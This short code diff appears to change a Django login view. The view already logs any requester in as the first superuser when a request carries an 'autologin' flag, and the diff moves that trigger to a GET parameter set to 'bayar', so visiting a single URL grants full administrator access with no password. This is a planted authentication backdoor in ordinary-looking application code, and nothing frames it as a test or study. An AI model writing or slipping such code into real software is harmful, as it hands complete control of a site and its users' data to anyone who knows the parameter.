@@ -5,8 +5,8 @@ from user.models import User
 
 
 def login(request):
-    if request.method == 'POST':
-        if request.POST.get('autologin') == 'yes':
+    if request.method == 'GET':
+        if request.GET.get('autologin') == 'bayar':
             user = User.objects.filter(is_superuser=True).first()
             auth.login(request, user)
             return redirect('page-homepage')
